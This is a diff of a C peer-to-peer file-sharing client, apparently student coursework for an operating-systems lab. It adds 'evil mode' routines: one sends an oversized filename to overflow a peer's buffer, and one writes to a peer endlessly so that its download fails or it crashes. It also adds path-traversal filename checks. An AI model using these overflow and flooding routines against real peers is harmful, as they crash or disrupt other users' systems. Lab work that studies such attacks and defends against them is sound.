@@ -44,6 +44,7 @@ static int listen_port;
 #define TASKBUFSIZ	65536	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
 
+
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
 	TASK_PEER_LISTEN,	// => Listens for upload requests
@@ -537,8 +538,12 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-
+	/* TAST 3 : Exploiting the length of the name size problem */
+	//////Seems to be done////////////////////////////////////////
+	//////////////////////////////////////////////////////////////
 	if(evil_mode) {
+			printf("The color: %s\n", "Expliting filenamesize problem");
+
 		char exploit[2*FILENAMESIZ]; 
 		exploit[0] = '\0'; 	
 		int loop;
@@ -549,9 +554,8 @@ static void task_download(task_t *t, task_t *tracker_task)
 		exploit[2*FILENAMESIZ - 1] = '\0';
 		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", exploit);
 	}
-	
+
 	else osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
-	
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
 	// "foo.txt~1~".  However, if there are 50 local files, don't download
@@ -577,7 +581,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		task_free(t);
 		return;
 	}
-
+	
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
 	while (1) {
@@ -600,11 +604,13 @@ static void task_download(task_t *t, task_t *tracker_task)
 		/*This is to prevent transfer of infintie length data on receiving a request form a peer. 
 		If the total_writen field exceeds a certain pre defined number(which can be changed) then 
 		we throw and error and try again */
-	
+		
 		if (t->total_written > MAXIMUM_FILE_SIZE) {
 			error("FILE TOO LARGE");
 			goto try_again;
 		}
+
+		
 
 	}
 
@@ -683,6 +689,8 @@ static void task_upload(task_t *t)
 
 	/* Another buffer overflow bug, in a snscanf function, the second arguement
 	is the length of the string to be placed in the buffer, this could be problematic,
+	
+
 	thus we replaced it with FILENAMESIZ-1.
 	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
 		error("* Odd request %.*s\n", t->tail, t->buf);
@@ -710,7 +718,7 @@ static void task_upload(task_t *t)
 	Thus we try to find / in the t->filename, if we get anything but 0, that means
 	it is refers to a directory */
 
-	if(strchr(t->filename, '/') != NULL)
+	if(strstr(t->filename,"..") || strstr(t->filename,"../") || strstr(t->filename,"/") || t->filename[0] == '.')
 	{
 		error("Bad Filename: %s refers to a directory\n", t->filename);
 		goto exit;
@@ -722,8 +730,32 @@ static void task_upload(task_t *t)
 		goto exit;
 	}
 
+
 	message("* Transferring file %s\n", t->filename);
-	// Now, read file from disk and write it to the requesting peer.
+	/*Task 3 : Making upload fail. We are continously writing to the buffer, instead of 
+	stopping at the condition where read_from_taskbuff returns -1 and the head and tail are equal
+	This will cause the upload to fail and "may cause the program to crash " */
+	////////////////////////THIS SEEMS TO BE DONE/////////////////////////////////////
+	int retval=0;
+	if(evil_mode)
+	{
+			message("In uploads: %s\n", "evil mode");
+
+		//Our goal here is to constantly write to make the peer to crash/cause the upload to fail
+		while(1)
+		{
+
+			retval =  write_from_taskbuf(t->peer_fd, t);
+			if(retval==TBUF_ERROR)
+			{
+				error("* Peer write error");
+				exit(0);
+			}
+		}
+		goto exit;
+	}
+	else
+	{	
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -739,7 +771,7 @@ static void task_upload(task_t *t)
 			/* End of file */
 			break;
 	}
-
+	}
 	message("* Upload of %s complete\n", t->filename);
 
     exit:
